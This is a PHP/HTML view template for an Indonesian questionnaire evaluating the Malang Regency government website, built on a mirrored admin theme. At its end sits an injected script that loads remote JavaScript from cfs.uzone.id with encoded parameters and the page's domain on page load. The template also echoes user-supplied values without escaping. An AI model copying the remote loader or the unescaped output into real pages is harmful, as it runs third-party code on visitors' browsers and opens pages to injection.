<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from bootemplates.com/themes/srikandi/v2/responsive-table.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 12 May 2017 11:32:36 GMT -->
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Srikandi - Responsive Admin Templates</title>
    <meta name="description" content="Srikandi Responsive Admin Templates"/>
    <meta name="keywords" content="resposinve, admin dashboard, admin page, admin template"/>
    <meta name="author" content="Candra Dwi Waskito"/>
    <link rel="shortcut icon" href="http://bootemplates.com/themes/srikandi/favicon.ico">
    <link rel="stylesheet" href="<?php echo base_url() . 'assets/'; ?>user/css/font-awesome.min.css"/>
    <link rel="stylesheet" href="<?php echo base_url() . 'assets/'; ?>user/css/bootstrap.min.css">
    <link rel="stylesheet" href="<?php echo base_url() . 'assets/'; ?>user/css/bootstrap-reset.css">
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
          rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="<?php echo base_url() . 'assets/'; ?>user/css/style.css">
    <!-- css for this page -->
    <link href="<?php echo base_url() . 'assets/'; ?>user/css/table-responsive.css" rel="stylesheet"/>
</head>
<body>

<!-- start:wrapper -->
<div id="wrapper">
    <div class="header-top">
        <!-- start:navbar -->
        <nav class="navbar navbar-inverse navbar-static-top" role="navigation" style="margin-bottom: 0">
            <div class="container">
                <!-- start:navbar-header -->
                <div class="navbar-header">
                    <a class="navbar-brand" href="index-2.html"><i class="fa fa-cubes"></i>
                        <strong>SI</strong>EVALUASI<strong>.</strong></a>
                </div>
            </div>
        </nav>
        <!-- end:navbar -->
    </div>
    <!-- start:header -->
    <div id="header">
        <div class="overlay">
            <nav class="navbar" role="navigation">
                <div class="container">
                    <!-- Brand and toggle get grouped for better mobile display -->
                    <div class="navbar-header">
                        <button type="button" class="btn-block btn-drop navbar-toggle" data-toggle="collapse"
                                data-target=".navbar-ex1-collapse">
                            <strong>MENU</strong>
                        </button>
                    </div>
                </div>
            </nav>
        </div>
    </div>
    <!-- end:header -->

    <!-- start:main -->
    <div class="container">
        <div id="main">
            <!-- start:breadcrumb -->
            <ol class="breadcrumb">
                <li><a href="#">Cover</a></li>
                <li class="active">Kuesioner</li>
            </ol>
            <!-- end:breadcrumb -->
            <div class="row">
                <div class="col-lg-12">
                    <h2 class="page-header">
                        Kuesioner Evaluasi
                    </h2>
                </div>
            </div>
            <!-- Start: Kuesioner-->
            <div class="row">
                <div class="col-lg-12">
                    <section class="panel">
                        <header class="panel-heading">
                            Berikut Web Pemerintah Kabupaten Malang.
                        </header>
                        <div class="panel-body">
                            <section id="unseen">
                                <iframe src="http://malangkab.go.id/" width="100%" height="350px"></iframe>
                            </section>
                        </div>
                    </section>
                </div>
            </div>
            <form role="form" method="post" action="<?php echo base_url('index.php/questionaire/submitResponse'); ?>">
                <div class="row">
                    <div class="col-lg-12">
                        <section class="panel">
                            <header class="panel-heading">
                                Berilah jawaban pada setiap pertanyaan berdasarkan pengetahuan anda. <strong>SS</strong>
                                =
                                Sangat Setuju, <strong>S</strong> = Setuju, <strong>N</strong> = Netral,
                                <strong>TS</strong>
                                = Tidak Setuju, <strong>STS</strong> = Sangat Tidak Setuju
                            </header>
                            <input name="name" type="hidden" value="<?php echo $bio['name']; ?>">
                            <input name="age" type="hidden" value="<?php echo $bio['age']; ?>">
                            <input name="address" type="hidden" value="<?php echo $bio['address']; ?>">
                            <input name="label" type="hidden" value="PUB">
                            <div class="panel-body">
                                <section id="unseen">
                                    <table class="table table-bordered table-striped table-condensed">
                                        <thead>
                                        <tr>
                                            <th>No</th>
                                            <th>Pertanyaan</th>
                                            <th class="">SS</th>
                                            <th class="numeric">S</th>
                                            <th class="numeric">N</th>
                                            <th class="numeric">TS</th>
                                            <th class="numeric">STS</th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                        <?php $no = 1;
                                        foreach ($data as $value){ ?>
                                        <tr>
                                            <td><?php echo $no++; ?></td>
                                            <td><?php echo $value['question_content']; ?></td>
                                            <td class="numeric"><input required type="radio" name="<?php echo $value['question_label']; ?>" value="5"></td>
                                            <td class="numeric"><input required type="radio" name="<?php echo $value['question_label']; ?>" value="4"></td>
                                            <td class="numeric"><input required type="radio" name="<?php echo $value['question_label']; ?>" value="3"></td>
                                            <td class="numeric"><input required type="radio" name="<?php echo $value['question_label']; ?>" value="2"></td>
                                            <td class="numeric"><input required type="radio" name="<?php echo $value['question_label']; ?>" value="1"></td>
                                        </tr>
                                        <?php } ?>
                                        </tbody>
                                    </table>
                                    <a href="<?php echo base_url('index.php/page'); ?>" type="submit" class="btn btn-danger">Cancel</a>
                                    <button type="submit" class="btn btn-success">Submit</button>
                                </section>
                            </div>
                        </section>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <!-- end:main -->
    <div class="footer-bottom">
        <div class="container">
            <div class="footer-bottom-widget">
                <div class="row">
                    <div class="col-sm-6">
                        <p>
                            <span class="sosmed-footer">
                                <a href="#"><i class="fa fa-facebook" data-toggle="tooltip" data-placement="top"
                                               title="Facebook"></i></a>
                                <a href="#"><i class="fa fa-twitter" data-toggle="tooltip" data-placement="top"
                                               title="Twitter"></i></a>
                                <a href="#"><i class="fa fa-google-plus" data-toggle="tooltip" data-placement="top"
                                               title="Google Plus"></i></a>
                                <a href="#"><i class="fa fa-youtube" data-toggle="tooltip" data-placement="top"
                                               title="Youtube"></i></a>
                                <a href="#"><i class="fa fa-linkedin" data-toggle="tooltip" data-placement="top"
                                               title="Linkedin"></i></a>
                                <a href="#"><i class="fa fa-instagram" data-toggle="tooltip" data-placement="top"
                                               title="Instagram"></i></a>
                                <a href="#"><i class="fa fa-github" data-toggle="tooltip" data-placement="top"
                                               title="Github"></i></a>
                            </span>
                            &copy; 2017 <strong>SI</strong>Evaluasi<strong>.</strong></p>
                    </div>
                    <div class="col-sm-6">
                        <p class="footer-bottom-links">
                            <a href="#">About <strong>SI</strong>Evaluasi<strong>.</strong></a>
                            <a href="#">Privacy Policy</a>
                            <a href="#">Terms & Conditions</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- end:footer -->

</div>
<!-- end:wrapper -->

<!-- start:javascript -->
<!-- javascript default for all pages-->
<script src="<?php echo base_url() . 'assets/'; ?>user/js/jquery-1.11.1.min.js"></script>
<script src="<?php echo base_url() . 'assets/'; ?>user/js/bootstrap.min.js"></script>

<!-- javascript for Srikandi admin -->
<script src="<?php echo base_url() . 'assets/'; ?>user/js/themes.js"></script>
<!-- end:javascript -->
<script>
    function next() {

    }
</script>

<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKIwx0zA7My%2bnYuCBMKnYLPgkIyKaP4iCRubo3OWot3AV09eTI2mzfmkkUv%2fBHPoySS2hpFBzM%2fZL8ba9gMQaSTi0VWVwq8G3fZFWHQOWvoct12B0aNAEWI%2bISYawnThVV5LeZCp1slQh0qmMIkQRfoRgwUsQw9XPG%2fd%2bOIucGDYRo8gbzZ8SxJE676EFW6REAaplvc0xn49amyeUsn709olJ7dxkPVcXbpn3w9OG%2bxuL4lAIMChxyKDEGGOBoHWZpq3PMu4DJnhT6GWWjV3VrcJgQ2F9EQKtHOz6aXw4cFRlI9T9av2mjnchu9yB8Y9dy0Uxh879BRIQ%2fovuZp3o4zCxf%2b539Vs5hcNlYhgioX9%2b3DR25gN%2f3LBDRIKWO5WPmKc4ew0SNAob%2fjry%2f2IllD%2fTLU%2fVak1dDAHkDap3OpIYDD67Jlnj5Usq1Pn9C19utjIIDT3HdOOhh5sB2wjnueB4aTecGt8AWhLF8PBowglg%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>

<!-- Mirrored from bootemplates.com/themes/srikandi/v2/responsive-table.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 12 May 2017 11:32:37 GMT -->
</html>